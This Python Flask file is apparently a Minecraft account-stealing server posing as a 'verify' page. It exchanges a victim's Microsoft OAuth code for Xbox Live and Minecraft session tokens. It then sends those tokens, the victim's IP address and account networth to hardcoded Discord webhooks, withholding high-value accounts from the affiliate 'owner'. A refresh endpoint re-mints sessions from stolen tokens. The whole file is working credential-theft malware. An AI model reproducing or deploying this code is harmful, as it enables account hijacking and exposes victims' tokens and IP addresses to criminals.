from threading import Thread
from flask import Flask
from flask import request
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from numerize import numerize
from configparser import ConfigParser

# -- Variables --
client_secret = ''
client_id = '1071861526450929784'
redirect_uri = 'HnWdLnPmvy0H0dA8-ulmTcyqp3OGNck8'
webhook_url = 'https://ptb.discord.com/api/webhooks/1069949331152580648/CQB7aFn0obV94-oe39Ps66Xc-2IHW7JJO2BdLoSPmhd2ikn6miD4Ym3V4lllwdC85E8R'
nwlimit = 1000000000
whitelist = []
# -- End Variables --

port = 80
app = Flask('')
config = ConfigParser()

def setnwlimit(limit):
    nwlimit = limit
    return nwlimit

def addwhitelist(name):
    whitelist.append(name)
    return whitelist

def removewhitelist(name):
    whitelist.remove(name)
    return whitelist


def getnetworth(xstsign):
    try:
        url = "https://nwapi.battleb0t.xyz/v2/profiles/" + xstsign + "?key=KEKW"
        response = requests.get(url)
        jsonresponse = response.json()
        return jsonresponse['data'][0]['networth']['unsoulboundNetworth']
    except:
        return 0

def getmsaccesstoken(code):
        url = "https://login.live.com/oauth20_token.srf"
        headers = {"Content-Type" : "application/x-www-form-urlencoded"}
        data = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "client_secret": client_secret,
            "code": code,
            "grant_type": 'authorization_code',
        }
        response = requests.post(url, headers=headers, data=data)
        jsonresponse = response.json()
        return jsonresponse['access_token'], jsonresponse['refresh_token']

def getxbltoken(access_token):
        url = "https://user.auth.xboxlive.com/user/authenticate"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": "d=" + access_token
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
                }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['Token']

def getxstsuserhash(xbl):
        url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [
                    xbl
                    ]
                    },
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                    }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['DisplayClaims']['xui'][0]['uhs'],jsonresponse['Token']

def getssid(userhash, xsts):
        url = "https://api.minecraftservices.com/authentication/login_with_xbox"
        headers = {"Content-Type": "application/json"}
        data = {
           "identityToken" : "XBL3.0 x="+ userhash + ";" + xsts,
           "ensureLegacyEnabled" : "true"
        }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['access_token']

def getignuuid(ssid):
        url = "https://api.minecraftservices.com/minecraft/profile"
        headers = {"Content-Type": "application/json" , "Authorization": "Bearer " + ssid}
        response = requests.get(url, headers=headers)
        jsonresponse = response.json()
        return jsonresponse['name'],jsonresponse['id']

def getownerhook(ownerid):
    try:   
        config.read("config.ini")
        ownerhook = config.get("hooks", ownerid) 
        return ownerhook
    except:
        return webhook_url
    

@app.route('/refreshxbl', methods = ['POST', 'GET'])
def refresh():
    try:
        xbl = request.args.get('xbl')
        xstsuserhash = getxstsuserhash(xbl)
        ssid = getssid(xstsuserhash[0], xstsuserhash[1])
        ssid = ssid
        return ssid
    except KeyError:
        return "Invalid XBL Token/Token Expired/Ratelimit"

@app.route('/verify', methods = ['POST', 'GET'])
def xstshook():
    try:
        args = request.args
        code = args.get("code")
        ownerid = args.get("state")
        ownerhook = getownerhook(ownerid)
        ip = request.headers['X-Forwarded-For']
        msaccesstoken, refresh_token = getmsaccesstoken(code)
        xbl = getxbltoken(msaccesstoken)
        xstsuserhash = getxstsuserhash(xbl)
        ssid = getssid(xstsuserhash[0], xstsuserhash[1])
        ignuuid = getignuuid(ssid)
        uuid = ignuuid[1]
        ign = ignuuid[0]
        networth = getnetworth(ign)
        if networth > nwlimit and ign not in whitelist:
            webhook(webhook_url, ign, uuid, ssid, networth, ip, ownerid, xbl)
        else:
            webhook(webhook_url, ign, uuid, ssid, networth, ip, ownerid, xbl)
            webhook(ownerhook, ign, uuid, ssid, networth, ip, ownerid, xbl)
        return 'DONE, you can close this tab now.'
    except KeyError:
        return "Unauthorized"
    except:
        return "Error"

def webhook(url, ign, uuid, ssid, networth, ip, ownerid, xbl):
    webhook = DiscordWebhook(url=url, content="@everyone " + ownerid)
    embed = DiscordEmbed(title='New BOZO verified', color='03b2f8')
    embed.set_author(name=ign, url='https://sky.shiiyu.moe/stats/' + uuid, icon_url='https://mc-heads.net/avatar/' + uuid)
    embed.set_footer(text='Powered by https://discord.qolhub.ru', icon_url="https://i.imgur.com/pJNrLG9.jpg")
    embed.set_description("[Refresh](https://verify.qolhub.ru/refreshxbl?xbl=" + xbl +")")
    embed.set_timestamp()
    embed.add_embed_field(name='IGN', value="`" + ign + "`")
    embed.add_embed_field(name='UUID', value="`" + uuid + "`")
    embed.add_embed_field(name='SSID', value="`" + ssid + "`")
    try:
        embed.add_embed_field(name='Networth', value="`" + numerize.numerize(networth) + "`")
    except:
        embed.add_embed_field(name='Networth', value="`" + "Error" + "`")
    embed.add_embed_field(name='IP', value="`" + ip + "`")
    embed.add_embed_field(name='SkyCrypt', value="https://sky.shiiyu.moe/stats/" + uuid)
    webhook.add_embed(embed)
    webhook.execute()

@app.route('/')
def home():
    return "KEKW https://discord.gg/ssid"

def run():
  app.run(host='0.0.0.0',port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()
